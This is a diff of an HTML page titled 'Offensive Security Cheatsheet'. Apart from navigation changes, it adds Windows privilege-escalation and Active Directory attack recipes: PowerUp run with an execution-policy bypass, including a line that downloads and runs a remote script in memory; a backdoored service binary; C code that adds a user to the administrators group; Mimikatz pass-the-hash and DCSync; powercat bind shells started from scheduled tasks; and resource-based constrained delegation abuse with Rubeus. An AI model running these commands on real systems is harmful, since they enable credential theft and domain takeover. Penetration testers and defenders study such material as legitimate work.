@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2020-01-04T16:29:46 CET">
+<meta name="revised" content="2020-01-25T16:00:32 CET">
 <title>Tricks :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -80,6 +80,13 @@
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
+      <li data-nav-id="/open-source-intelligence-osint/general/methodology/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/general/methodology/">
+            Methodology
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
         </ul>
     </li>
     <li data-nav-id="/open-source-intelligence-osint/technical-recon/" class="dd-item haschildren
@@ -113,13 +120,6 @@
         <div>
           <a href="/open-source-intelligence-osint/technical-recon/company_meta/">
             Company General Informations
-          </a><i class="fa fa-circle-thin read-icon"></i>
-        </div>
-    </li>
-      <li data-nav-id="/open-source-intelligence-osint/technical-recon/documents_metadata/" class="dd-item">
-        <div>
-          <a href="/open-source-intelligence-osint/technical-recon/documents_metadata/">
-            Public Documents and Metadata
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
@@ -207,6 +207,13 @@
         </div>
     </li>
         </ul>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/technical-recon/documents_metadata/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/technical-recon/documents_metadata/">
+            
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
     </li>
         </ul>
     </li>
@@ -334,6 +341,20 @@
         <div>
           <a href="/open-source-intelligence-osint/human-recon/geolocation/">
             Geolocation
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/human-recon/phone_number/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/human-recon/phone_number/">
+            Geolocation
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/human-recon/images/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/human-recon/images/">
+            Images
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
@@ -790,6 +811,13 @@
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
+      <li data-nav-id="/web-attacks/amazon_web_services/" class="dd-item">
+        <div>
+          <a href="/web-attacks/amazon_web_services/">
+            Amazon Web Services (AWS)
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
         </ul>
     </li>
     <li data-nav-id="/network/" class="dd-item haschildren
@@ -1186,6 +1214,13 @@
         <div>
           <a href="/other-systems/ipbx/">
             IPBX
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/other-systems/freeipa/" class="dd-item">
+        <div>
+          <a href="/other-systems/freeipa/">
+            FREEIPA
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
@@ -1611,7 +1646,21 @@ exploit/windows/local/always_install_elevated</code></pre></div>
 
 <h3 id="powersploit-powerup">PowerSploit / PowerUp</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Copy PowerUp.ps1 to Powershell bypass Execution policy</span>
-Invoke-AllChecks</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf shell&gt; powershell.exe -exec bypass -Command “<span style="color:#111">&amp;</span> <span style="color:#f92672">{</span>Import-Module .<span style="color:#8045ff">\P</span>owerUp.ps1<span style="color:#111">;</span> Invoke-AllChecks<span style="color:#f92672">}</span>”</code></pre></div>
+powershell -exec bypass
+Import-Module .<span style="color:#8045ff">\P</span>owerUp.ps1
+Invoke-AllChecks
+
+<span style="color:#75715e"># You can also use SharUp.exe</span>
+<span style="color:#75715e"># Need to be compiled, but newer tool.</span></code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf shell&gt; powershell.exe -exec bypass -Command “<span style="color:#111">&amp;</span> <span style="color:#f92672">{</span>Import-Module .<span style="color:#8045ff">\P</span>owerUp.ps1<span style="color:#111">;</span> Invoke-AllChecks<span style="color:#f92672">}</span>”</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">C:&gt; powershell.exe -nop -exec bypass
+PS C:<span style="color:#8045ff">\&gt;</span> Import-Module PowerUp.ps1
+PS C:<span style="color:#8045ff">\&gt;</span> Invoke-AllChecks <span style="color:#111">|</span> Out-File -Encoding ASCII checks.txt
+
+<span style="color:#75715e"># Full in memory</span>
+C:<span style="color:#8045ff">\&gt;</span> powershell -nop -exec bypass -c “IEX <span style="color:#f92672">(</span>New-Object Net.WebClient<span style="color:#f92672">)</span>.DownloadString<span style="color:#f92672">(</span>‘http://bit.ly/1mK64oH’<span style="color:#f92672">)</span><span style="color:#111">;</span> Invoke-AllChecks”</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># If a binary seems to be exploitable you can backup real service and create a backdored one</span>
+PS C:<span style="color:#8045ff">\&gt;</span> Write-ServiceEXE -ServiceName CustomSVC -UserName backdoor -Password password123 -Verbose
+
+<span style="color:#75715e"># Restore the real service</span>
+PS C:<span style="color:#8045ff">\&gt;</span> Restore-ServiceEXE -ServiceName CustomSVC</code></pre></div>
 <p><br/></p>
 
 <h3 id="services-and-scheduled-tasks">Services and Scheduled Tasks</h3>
@@ -1655,7 +1704,31 @@ reg add <span style="color:#d88200">&#34;HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001
 shutdown /r /t <span style="color:#ae81ff">0</span>
 
 <span style="color:#75715e"># MSF module</span>
-exploit/windows/local/service_permissions</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#111">echo</span> %path%
+exploit/windows/local/service_permissions
+
+<span style="color:#75715e"># Exploiting service with write permissions</span>
+<span style="color:#75715e"># You want to have (F) or (C) rights</span>
+C:<span style="color:#8045ff">\p</span>ath<span style="color:#8045ff">\t</span>o<span style="color:#8045ff">\f</span>ile.exe 
+BUILTIN<span style="color:#8045ff">\U</span>sers:F
+BUILTIN<span style="color:#8045ff">\P</span>ower Users:C 
+BUILTIN<span style="color:#8045ff">\A</span>dministrators:F 
+NT AUTHORITY<span style="color:#8045ff">\S</span>YSTEM:F
+
+<span style="color:#75715e"># Then you can add your own binary</span>
+<span style="color:#75715e">#include &lt;stdlib.h&gt;</span>
+int main <span style="color:#f92672">()</span>
+<span style="color:#f92672">{</span>
+int i<span style="color:#111">;</span>
+    <span style="color:#111">i</span> <span style="color:#f92672">=</span> system<span style="color:#f92672">(</span><span style="color:#d88200">&#34;net localgroup administrators theusername /add&#34;</span><span style="color:#f92672">)</span><span style="color:#111">;</span>
+<span style="color:#00a8c8">return</span> <span style="color:#ae81ff">0</span><span style="color:#111">;</span>
+<span style="color:#f92672">}</span>
+
+<span style="color:#75715e"># Compile it</span>
+i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe
+
+<span style="color:#75715e"># And restart the service</span>
+wmic service NAMEOFSERVICE call startservice
+net stop <span style="color:#f92672">[</span>service name<span style="color:#f92672">]</span> <span style="color:#f92672">&amp;&amp;</span> net start <span style="color:#f92672">[</span>service name<span style="color:#f92672">]</span></code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#111">echo</span> %path%
 
 <span style="color:#75715e"># Check permissions for a service in PAth</span>
 accesschk.exe -dqv <span style="color:#d88200">&#34;C:\Python27&#34;</span>
@@ -1707,6 +1780,91 @@ accesschk.exe -uwdqs Users c:<span style="color:#8045ff">\
 <span style="color:#75715e"># Find all weak file permissions per drive.</span>
 accesschk.exe -uwqs Users c:<span style="color:#8045ff">\*</span>.*
 accesschk.exe -uwqs <span style="color:#d88200">&#34;Authenticated Users&#34;</span> c:<span style="color:#8045ff">\*</span>.*</code></pre></div>
+<p><br/></p>
+
+<h3 id="pass-the-hash-using-machine-accounts">Pass the Hash using Machine Accounts</h3>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Need to be local admin on the target machine</span>
+
+<span style="color:#75715e"># Finding domain computers that are members of interesting groups</span>
+Get-ADComputer -Filter * -Properties MemberOf <span style="color:#111">|</span> ? <span style="color:#f92672">{</span><span style="color:#111">$_</span>.MemberOf<span style="color:#f92672">}</span>
+net group <span style="color:#d88200">&#34;domain admins&#34;</span> /domain
+net localgroup administrators /domain
+
+<span style="color:#75715e"># After gaining local admin, hash machine extraction</span>
+sekurlsa::logonPasswords
+
+<span style="color:#75715e"># Compromised user can&#39;t access the DC</span>
+dir <span style="color:#8045ff">\\</span>dc01<span style="color:#8045ff">\c</span>$
+
+<span style="color:#75715e"># You can use Mimikatz to PtH and elevate to domain admin because WS01$ is in Domain Admins</span>
+sekurlsa::pth /user:ws01$ /domain:offense.local /ntlm:ab53503b0f35c9883ff89b75527d5861</code></pre></div>
+<p><br/></p>
+
+<h3 id="get-local-privileges-back">Get Local Privileges back</h3>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># From https://itm4n.github.io/localservice-privileges/</span>
+
+<span style="color:#75715e"># Create a scheduled task</span>
+PS&gt; <span style="color:#111">$TaskAction</span> <span style="color:#f92672">=</span> New-ScheduledTaskAction -Execute <span style="color:#d88200">&#34;powershell.exe&#34;</span> -Argument <span style="color:#d88200">&#34;-Exec Bypass -Command `&#34;</span>. C:<span style="color:#8045ff">\T</span>OOLS<span style="color:#8045ff">\p</span>owercat.ps1<span style="color:#111">;</span> powercat -l -p <span style="color:#ae81ff">7002</span> -ep<span style="color:#d88200">`</span><span style="color:#d88200">&#34;&#34;</span>
+PS&gt; Register-ScheduledTask -Action <span style="color:#111">$TaskAction</span> -TaskName <span style="color:#d88200">&#34;SomeTask&#34;</span>
+PS&gt; Start-ScheduledTask -TaskName <span style="color:#d88200">&#34;SomeTask&#34;</span>
+
+<span style="color:#75715e"># Then connect to the bind shell</span>
+. .<span style="color:#8045ff">\p</span>owercat.ps1
+powercat -c <span style="color:#ae81ff">127</span>.0.0.1 -p <span style="color:#ae81ff">7002</span>
+
+---------------
+
+<span style="color:#75715e"># In order to get the SeImpersonatePrivilege back, you need to specify it clearly</span>
+<span style="color:#75715e"># Create a list of privileges</span> 
+<span style="color:#f92672">[</span>System.String<span style="color:#f92672">[]]</span><span style="color:#111">$Privs</span> <span style="color:#f92672">=</span> <span style="color:#d88200">&#34;SeAssignPrimaryTokenPrivilege&#34;</span>, <span style="color:#d88200">&#34;SeAuditPrivilege&#34;</span>, <span style="color:#d88200">&#34;SeChangeNotifyPrivilege&#34;</span>, <span style="color:#d88200">&#34;SeCreateGlobalPrivilege&#34;</span>, <span style="color:#d88200">&#34;SeImpersonatePrivilege&#34;</span>, <span style="color:#d88200">&#34;SeIncreaseQuotaPrivilege&#34;</span>, <span style="color:#d88200">&#34;SeShutdownPrivilege&#34;</span>, <span style="color:#d88200">&#34;SeUndockPrivilege&#34;</span>, <span style="color:#d88200">&#34;SeIncreaseWorkingSetPrivilege&#34;</span>, <span style="color:#d88200">&#34;SeTimeZonePrivilege&#34;</span>
+
+<span style="color:#75715e"># Create a Principal for the task</span> 
+<span style="color:#111">$TaskPrincipal</span> <span style="color:#f92672">=</span> New-ScheduledTaskPrincipal -UserId <span style="color:#d88200">&#34;LOCALSERVICE&#34;</span> -LogonType ServiceAccount -RequiredPrivilege <span style="color:#111">$Privs</span>
+
+<span style="color:#75715e"># Create an action for the task</span> 
+<span style="color:#111">$TaskAction</span> <span style="color:#f92672">=</span> New-ScheduledTaskAction -Execute <span style="color:#d88200">&#34;powershell.exe&#34;</span> -Argument <span style="color:#d88200">&#34;-Exec Bypass -Command `&#34;</span>. C:<span style="color:#8045ff">\T</span>OOLS<span style="color:#8045ff">\p</span>owercat.ps1<span style="color:#111">;</span> powercat -l -p <span style="color:#ae81ff">7003</span> -ep<span style="color:#d88200">`</span><span style="color:#d88200">&#34;&#34;</span>
+<span style="color:#75715e"># Create the task</span>
+Register-ScheduledTask -Action <span style="color:#111">$TaskAction</span> -TaskName <span style="color:#d88200">&#34;SomeTask2&#34;</span> -Principal <span style="color:#111">$TaskPrincipal</span>
+<span style="color:#75715e"># Start the task</span>
+Start-ScheduledTask -TaskName <span style="color:#d88200">&#34;SomeTask2&#34;</span></code></pre></div>
+<p><br/></p>
+
+<h3 id="rbcd-exploitation">RBCD Exploitation</h3>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">https://github.com/aas-n/leHACK19
+
+<span style="color:#75715e"># Importing Powerview and Powermad</span>
+Import-Module .<span style="color:#8045ff">\P</span>owerview.ps1
+Import-Module .<span style="color:#8045ff">\P</span>owermad.ps1
+
+<span style="color:#75715e"># Authentication</span>
+<span style="color:#111">$TargetComputer</span> <span style="color:#f92672">=</span> <span style="color:#d88200">&#34;DC01.domain.lan&#34;</span>
+<span style="color:#111">$SecPassword</span> <span style="color:#f92672">=</span> ConvertTo-SecureString <span style="color:#d88200">&#39;passw0rd&#39;</span> -AsPlainText -Force
+<span style="color:#111">$Cred</span> <span style="color:#f92672">=</span> New-Object System.Management.Automation.PSCredential<span style="color:#f92672">(</span><span style="color:#d88200">&#39;DOMAIN\ControlledAccount&#39;</span>, <span style="color:#111">$SecPassword</span><span style="color:#f92672">)</span>
+
+<span style="color:#75715e"># Get our user&#39;s SID</span>
+<span style="color:#111">$AttackerSID</span> <span style="color:#f92672">=</span> Get-DomainUser ControlledUser -Credential <span style="color:#111">$Cred</span> -Server <span style="color:#ae81ff">10</span>.10.10.10 -Properties objectsid <span style="color:#111">|</span> Select -Expand objectsid
+<span style="color:#111">$ACE</span> <span style="color:#f92672">=</span> Get-DomainObjectACL <span style="color:#111">$TargetComputer</span> -Credential <span style="color:#111">$Cred</span> -Server <span style="color:#ae81ff">10</span>.10.10.10 <span style="color:#111">|</span> ?<span style="color:#f92672">{</span><span style="color:#111">$_</span>.SecurityIdentifier -match <span style="color:#111">$AttackerSID</span><span style="color:#f92672">}</span>
+
+<span style="color:#75715e"># Adding a machine and getting SID</span>
+New-MachineAccount -Credential <span style="color:#111">$Cred</span> -Domain domain.lan -DomainController <span style="color:#ae81ff">10</span>.10.10.10 -MachineAccount lleXXXXX -Password <span style="color:#00a8c8">$(</span>ConvertTo-SecureString <span style="color:#d88200">&#39;passw0rd&#39;</span> -AsPlainText -Force<span style="color:#00a8c8">)</span>
+<span style="color:#111">$ComputerSID</span> <span style="color:#f92672">=</span> Get-DomainComputer lleXXXXX -Credential <span style="color:#111">$Cred</span> -Server <span style="color:#ae81ff">10</span>.10.10.10 -Properties objectsid <span style="color:#111">|</span> Select -Expand objectsid
+
+<span style="color:#75715e"># Creating structure to store in Allowedtoact in the DC</span>
+<span style="color:#111">$SD</span><span style="color:#f92672">=</span> New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList <span style="color:#d88200">&#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;</span><span style="color:#00a8c8">$(</span><span style="color:#111">$ComputerSID</span><span style="color:#00a8c8">)</span><span style="color:#d88200">)&#34;</span>
+<span style="color:#111">$SDBytes</span> <span style="color:#f92672">=</span> New-Object byte<span style="color:#f92672">[]</span> <span style="color:#f92672">(</span><span style="color:#111">$SD</span>.BinaryLength<span style="color:#f92672">)</span>
+<span style="color:#111">$SD</span>.GetBinaryForm<span style="color:#f92672">(</span><span style="color:#111">$SDBytes</span>, <span style="color:#ae81ff">0</span><span style="color:#f92672">)</span>
+
+<span style="color:#75715e"># Rewrite Allowedtoact properties on the DC</span>
+Get-DomainComputer <span style="color:#111">$TargetComputer</span> -Credential <span style="color:#111">$Cred</span> -Server <span style="color:#ae81ff">10</span>.10.10.10 <span style="color:#111">|</span> Set-DomainObject -Credential <span style="color:#111">$Cred</span> -Server <span style="color:#ae81ff">10</span>.10.10.10 -Set @<span style="color:#f92672">{</span><span style="color:#d88200">&#39;msds-allowedtoactonbehalfofotheridentity&#39;</span><span style="color:#f92672">=</span><span style="color:#111">$SDBytes</span><span style="color:#f92672">}</span>
+
+<span style="color:#75715e"># Now you can impersonate the domain admin account on the DC using the machine account</span>
+.<span style="color:#8045ff">\R</span>ubeus.exe <span style="color:#111">hash</span> /password:passw0rd /user:lleXXXXX /domain:domain.lan
+.<span style="color:#8045ff">\R</span>ubeus.exe s4u /user:lleXXXXX$ /rc4:&lt;hash&gt; /impersonateuser:Administrator /msdsspn:ldap/DC01.domain.lan /ptt /dc:10.10.10.10 /domain:domain.lan
+.<span style="color:#8045ff">\R</span>ubeus.exe klist
+
+<span style="color:#75715e"># Then, you can get the NTLM hash of domain admin using DCSync and Mimikatz</span>
+.<span style="color:#8045ff">\M</span>imikatz.exe
+mimikatz&gt; lsadump::dcsync /user:domain<span style="color:#8045ff">\A</span>dminisrator /domain:domain.lan /dc:DC01.domain.lan</code></pre></div>
 
     
     
